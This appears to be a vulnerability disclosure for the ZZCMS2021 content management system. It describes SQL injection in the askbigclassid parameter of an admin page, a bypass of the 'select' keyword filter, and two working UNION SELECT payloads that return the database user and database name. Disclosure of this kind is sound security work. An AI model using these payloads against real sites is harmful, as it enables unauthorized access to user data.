# ZZCMS2021 

Profile
-----
    ZZCMS2021 has a SQL injection vulnerability that allows an attacker to access /admin/ask.php?The askBigClassid parameter on the do=add page retrieves sensitive data, causing sensitive information leakage of users.

Location
----
    http://ip/admin/ask.php?do=add

Affected Products
----
    ZZCMS2021

Proof
----
1.Request the page as normal and get the response

![](https://github.com/Boomingjacob/ZZCMS/blob/main/1.jpg)
2.If the invalid character "select" is used, the response will report an error

![](https://github.com/Boomingjacob/ZZCMS/blob/main/2.jpg)

3.Use the c=siteconfig.php parameter in the request path to bypass sensitive strings such as select
Payload：askbigclassid=-1+union+select+user(),2,3,4,5,6,7,8,9,10,11
Query the current user name: root

![](https://github.com/Boomingjacob/ZZCMS/blob/main/3.jpg)

4.Payload：askbigclassid=-1+union+select+database(),2,3,4,5,6,7,8,9,10,11
Query the current database name: ZZCMS

![](https://github.com/Boomingjacob/ZZCMS/blob/main/4.jpg)
